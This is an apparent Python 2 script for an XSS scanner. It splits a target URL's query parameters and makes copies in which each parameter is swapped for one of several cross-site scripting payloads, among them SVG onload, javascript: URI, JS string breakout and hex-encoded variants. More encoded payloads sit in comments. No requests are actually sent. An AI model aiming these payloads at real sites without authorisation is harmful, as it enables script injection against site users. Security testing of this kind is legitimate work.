#!/usr/bin/env python2
# -*- coding: utf-8 -*-

'''XSS vectors in addition to GET URL parameters to add:
    UA
    Referer
    POST params
    All headers?

Encoding:
    hex
    &quot; url stuff
    unicode'''

import gevent.monkey
gevent.monkey.patch_all()

import logging
import gevent.pool
import gevent.queue
import urllib
import time
import requests
import gevent
#from BeautifulSoup import UnicodeDammit
import lxml.html
import sys
import argparse
from random import randrange
from urlparse import urlparse, parse_qs, parse_qsl
import socket
#socket.setdefaulttimeout(30)


def parse_args():
    ''' Create arguments '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL with variables to test")
    parser.add_argument("-p", "--parallel", default=500, help="Specifies how many pages you want to crawl in parallel. Default = 500")
    return parser.parse_args()

class XSS_tester():

    def __init__(self):
        #self.url = url
        self.username = ''
        self.password = ''
        # Unicode encoding
        # < = %uff1c, > = %uff1e, " = %u0022
        self.payloads = ['"><SvG/oNlOaD=prompt(98)>', # Basic test within attribute like <meta value="INJECT">
                         '/>SvG/OnLOAd=prompt(98)', # Basic test within html element like <title>INJECT</title>
                         'jAvAscRiPt:prompt(98)',
                         '\';prompt(98);//', # Test for XSS in embedded JS
                         '%22%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%70%72%6F%6D%70%74%28%39%38%29%3E'] # Hex encoded ">svg/onload=prompt(98)>
                         #'%u0022%uff1e%uff1csvg/onLoAd=prompt(98)%uff1e', # Unicode encoded no double quote, no < > '
                         #'<object data=data:text/html;base64,Ij48c3ZnL29ubG9hZD1wcm9tcHQoNDMpPg==></object>'] # base64
                         #'%2522%253E%253CsVg%252FonLoAd%253Dprompt(79)%253E', # double encoded  < " > =

    def getURLparams(self, url):
        ''' Parse out the URL parameters '''
        parsedUrl = urlparse(url)
        #self.path = parsedUrl.path
        #self.hostname = parsedUrl.hostname
        #self.protocol = parsedUrl.scheme+'://'
        fullParams = parsedUrl.query
        params = parse_qsl(fullParams) #parse_qsl rather than parse_ps in order to preserve order

        return params

    def change_params(self, params):
        ''' Returns a list of complete parameters, each with 1 parameter changed to an XSS vector '''
        changedParams = []
        changedParam = False
        moddedParams = []
        #allModdedParams = []
        allModdedParams = {}

        # Create a list of lists, each list will be the URL we will test
        # This preserves the order of the URL parameters and will also
        # test each parameter individually instead of all at once
        for payload in self.payloads:
            allModdedParams[payload] = []
            for x in xrange(0, len(params)):
                for p in params:
                    param = p[0]
                    value = p[1]
                    # If a parameter has not been modified yet
                    if param not in changedParams and changedParam == False:
                        newValue = payload
                        changedParams.append(param)
                        p = (param, newValue)
                        moddedParams.append(p)
                        changedParam = True
                    else:
                        moddedParams.append(p)

                # Reset so we can step through again and change a diff param
                #allModdedParams.append(moddedParams)
                #allModdedParams[payload] = allModdedParams[payload]+moddedParams
                allModdedParams[payload].append(moddedParams)

                changedParam = False
                moddedParams = []

            # Reset the list of changed params each time a new payload is attempted
            changedParams = []

        return allModdedParams

    def main(self, url):
        xssedLinks = []

        params = self.getURLparams(url)
        moddedParams = self.change_params(params)

        return moddedParams

        #print 'old url:', url
        #for payload in moddedParams:
        #    for params in moddedParams[payload]:
        #        joinedParams = urllib.urlencode(params, doseq=1) # doseq maps the params back together
        #        newUrl = urllib.unquote(self.protocol+self.hostname+self.path+'?'+joinedParams)
        #        print 'new url:', newUrl
        #        xssedLinks.append(newUrl)
        #return xssedLinks

X = XSS_tester().main(parse_args().url)
